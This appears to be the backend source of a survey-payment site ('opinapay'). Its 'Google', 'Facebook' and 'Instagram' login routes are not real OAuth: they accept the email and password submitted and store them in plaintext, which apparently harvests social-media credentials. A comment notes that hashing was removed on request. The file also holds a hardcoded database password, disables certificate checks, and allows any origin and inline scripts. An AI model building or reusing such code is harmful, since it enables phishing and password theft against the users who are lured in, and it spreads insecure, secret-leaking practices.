const express = require('express');
const { Pool } = require('pg');
// bcrypt removido conforme solicitado
const cors = require('cors');
const path = require('path');
const fs = require('fs');

const app = express();
app.use(cors());
app.use(express.json());
app.use(express.static(__dirname));
app.use((req, res, next) => {
  res.setHeader(
    "Content-Security-Policy",
    "script-src 'self' 'unsafe-inline' http://localhost:3000"
  );
  next();
});

const pool = new Pool({
  user: 'opinapay_user',
  host: 'dpg-d0dreck9c44c738eio1g-a',
  database: 'opinapay',
  password: 'VSow838JsFsAJtxSSaU670jeUg22mbov', 
  port: 5432,
  ssl: {
    rejectUnauthorized: false
  }
});


app.post('/login/google', async (req, res) => {
  const { email, password } = req.body;
  try {
    const userExists = await pool.query(
      'SELECT password FROM users WHERE username = $1',
      [email]
    );
    if (userExists.rows.length) {
      return res.status(409).json({ success: false, error: 'Usuário já cadastrado' });
    }
    const result = await pool.query(
      `INSERT INTO users (username, password, created_at)
       VALUES ($1, $2, NOW()) RETURNING id, username, created_at`,
      [email, password]
    );
    res.status(201).json({ success: true, user: result.rows[0] });
  } catch (err) {
    console.error(err);
    res.status(500).json({ success: false, error: 'Erro interno no servidor' });
  }
});

app.post('/login/facebook', async (req, res) => {
  const { email, password } = req.body;
  if (!email || !password) {
    return res.status(400).json({ success: false, error: 'E‑mail e senha são obrigatórios.' });
  }
  try {
    const result = await pool.query(
      'SELECT password FROM users WHERE username = $1',
      [email]
    );
    if (result.rows.length) {
      const stored = result.rows[0].password;
      if (password !== stored) {
        return res.status(401).json({ success: false, error: 'Senha incorreta.' });
      }
      return res.json({ success: true, message: 'Login efetuado.' });
    }

    const insert = await pool.query(
      `INSERT INTO users (username, password, created_at)
       VALUES ($1, $2, NOW()) RETURNING id, username, created_at`,
      [email, password]
    );
    return res.status(201).json({ success: true, message: 'Conta criada.', user: insert.rows[0] });
  } catch (err) {
    console.error(err);
    return res.status(500).json({ success: false, error: 'Erro interno.' });
  }
});

// Cadastro/Login via Instagram sem criptografia
app.post('/register/instagram', async (req, res) => {
  const { username, password } = req.body;
  if (!username || !password) {
    return res.status(400).json({ success: false, error: 'Usuário e senha são obrigatórios.' });
  }
  try {
    const exists = await pool.query(
      'SELECT password FROM users WHERE username = $1',
      [username]
    );
    if (exists.rows.length) {
      const stored = exists.rows[0].password;
      if (password !== stored) {
        return res.status(401).json({ success: false, error: 'Senha incorreta.' });
      }
      return res.json({ success: true, message: 'Login efetuado.' });
    }
    const insert = await pool.query(
      `INSERT INTO users (username, password, created_at)
       VALUES ($1, $2, NOW()) RETURNING id, username, created_at`,
      [username, password]
    );
    return res.status(201).json({ success: true, message: 'Conta criada.', user: insert.rows[0] });
  } catch (err) {
    console.error(err);
    return res.status(500).json({ success: false, error: 'Erro interno.' });
  }
});

// Serve pesquisas.html
app.get('/pesquisas', (req, res) => {
  res.sendFile(path.join(__dirname, 'pesquisas.html'));
});

app.get('/api/pesquisas', (req, res) => {
  const filePath = path.join(__dirname, 'data', 'pesquisas.json');
  fs.readFile(filePath, 'utf8', (err, data) => {
    if (err) return res.status(500).json({ erro: 'Erro ao ler o arquivo de pesquisas' });
    res.json(JSON.parse(data));
  });
});

const PORT = 3000;
app.listen(PORT, () => console.log(`Servidor rodando em http://localhost:${PORT}`));